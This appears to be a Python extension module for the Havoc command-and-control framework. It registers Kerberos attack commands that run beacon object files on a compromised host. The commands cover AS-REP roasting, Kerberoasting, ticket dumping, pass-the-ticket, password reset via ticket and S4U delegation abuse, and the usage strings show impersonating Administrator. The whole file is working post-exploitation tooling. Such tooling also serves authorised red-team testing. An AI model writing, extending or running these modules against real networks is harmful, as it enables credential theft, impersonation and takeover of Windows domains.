from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

def common_task(taskDesc, filename, demonID, *param, ):
    packer: Packer = Packer()

    demon = Demon(demonID)
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon {taskDesc} by HackerRalf")

    arg = ' '.join(param)
    packer.addstr(arg)
    demon.InlineExecute(TaskID, "go", f"_bin/{filename}.x64.o", packer.getbuffer(), False)

    return TaskID

def krb_asreproasting( demonID, *param ):
    return common_task( "ASREPROASTING", "asreproasting", demonID, *param)

def krb_asktgt( demonID, *param ):
    return common_task( "ASKTGT", "asktgt", demonID, *param)

def krb_asktgs( demonID, *param ):
    return common_task( "ASKTGS", "asktgs", demonID, *param)

def krb_changepw( demonID, *param ):
    return common_task( "CHANGEPW", "changepw", demonID, *param)

def krb_describe( demonID, *param ):
    return common_task( "DESCRIBE", "describe", demonID, *param)

def krb_dump( demonID, *param ):
    return common_task( "DUMP", "dump", demonID, *param)

def krb_hash( demonID, *param ):
    return common_task( "HASH", "hash", demonID, *param)

def krb_kerberoasting( demonID, *param ):
    return common_task( "KERBEROASTING", "kerberoasting", demonID, *param)

def krb_klist( demonID, *param ):
    return common_task( "KLIST", "klist", demonID, *param)

def krb_ptt( demonID, *param ):
    return common_task( "PTT", "ptt", demonID, *param)

def krb_purge( demonID, *param ):
    return common_task( "PURGE", "purge", demonID, *param)

def krb_renew( demonID, *param ):
    return common_task( "RENEW", "renew", demonID, *param)

def krb_s4u( demonID, *param ):
    return common_task( "S4U", "s4u", demonID, *param)

def krb_cross_s4u( demonID, *param ):
    return common_task( "CROSS_S4U", "cross_s4u", demonID, *param)

def krb_tgtdeleg( demonID, *param ):
    return common_task( "TGTDELEG", "tgtdeleg", demonID, *param)

def krb_triage( demonID, *param ):
    return common_task( "TRIAGE", "triage", demonID, *param)

# RegisterModule( "kerbeus", "Kerberos abuse (kerbeus BOF)", "", "", "", "" )
RegisterCommand( krb_asreproasting, "", "krb_asreproasting", "Perform AS-REP roasting", 0, "/user:USER [/dc:DC] [/domain:DOMAIN]", "/user:pre_user" )
RegisterCommand( krb_asktgt, "", "krb_asktgt", "Retrieve a TGT", 0, "/user:USER /password:PASSWORD [/domain:DOMAIN] [/dc:DC] [/enctype:{rc4|aes256}] [/ptt] [/nopac] [/opsec]\n                               /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n                               /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n                               /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC] [/ptt]", "/user:Admin /password:QWErty /enctype:aes256 /opsec /ptt" )
RegisterCommand( krb_asktgs, "", "krb_asktgs", "Retrieve a TGS", 0, "/ticket:BASE64 /service:SPN1,SPN2,... [/domain:DOMAIN] [/dc:DC] [/tgs:BASE64] [/targetdomain:DOMAIN] [/targetuser:USER] [/enctype:{rc4|aes256}] [/ptt] [/keylist] [/u2u] [/opsec]", "/service:CIFS/dc.domain.local /ticket:doIF8DCCBey... /opsec" )
RegisterCommand( krb_changepw, "", "krb_changepw", "Reset a user's password from a supplied TGT", 0, "/ticket:BASE64 /new:PASSWORD [/dc:DC] [/targetuser:USER] [/targetdomain:DOMAIN]", "/new:New_P4ss /ticket:doIF8DCCBey..." )
RegisterCommand( krb_describe, "", "krb_describe", "Parse and describe a ticket", 0, "/ticket:BASE64", "/ticket:doIF8DCCBey..." )
RegisterCommand( krb_dump, "", "krb_dump", "Dump tickets", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "" )
RegisterCommand( krb_hash, "", "krb_hash", "Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1 hashes", 0, "/password:PASSWORD [/user:USER] [/domain:DOMAIN]", "/password:QWErty" )
RegisterCommand( krb_kerberoasting, "", "krb_kerberoasting", "Perform Kerberoasting", 0, "/spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]\n                                      /spn:SPN /ticket:BASE64 [/dc:DC]", "/spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey..." )
RegisterCommand( krb_klist, "", "krb_klist", "List tickets", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "/luid:3ea8" )
RegisterCommand( krb_ptt, "", "krb_ptt", "Submit a TGT", 0, "/ticket:BASE64 [/luid:LOGONID]", "/ticket:doIF8DCCBey..." )
RegisterCommand( krb_purge, "", "krb_purge", "Purge tickets", 0, "/ticket:BASE64 [/luid:LOGONID]", "/luid:3ea8" )
RegisterCommand( krb_renew, "", "krb_renew", "Renew a TGT", 0, "/ticket:BASE64 [/dc:DC] [/ptt]", "/ticket:doIF8DCCBey..." )
RegisterCommand( krb_s4u, "", "krb_s4u", "Perform S4U constrained delegation abuse", 0, "/ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]", "/ticket:doIF8DCCBey... /impersonateuser:Administrator /service:host/comp.domain.local /altservice:http,cifs" )
RegisterCommand( krb_cross_s4u, "", "krb_cross_s4u", "Perform S4U constrained delegation abuse across domains", 0, "krb_cross_s4u /ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/nopac] [/self]", "/ticket:doIF8DCCBey... /impersonateuser:Administrator /targetdomain:sdomain.local /targetdc:dc.sdomain.local /service:host/comp.sdomain.local /altservice:http,cifs" )
RegisterCommand( krb_tgtdeleg, "", "krb_tgtdeleg", "Retrieve a usable TGT for the current user without elevation by abusing the Kerberos GSS-API", 0, "[/target:SPN]", "" )
RegisterCommand( krb_triage, "", "krb_triage", "List tickets in table format", 0, "[/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]", "/luid:3ea8" )
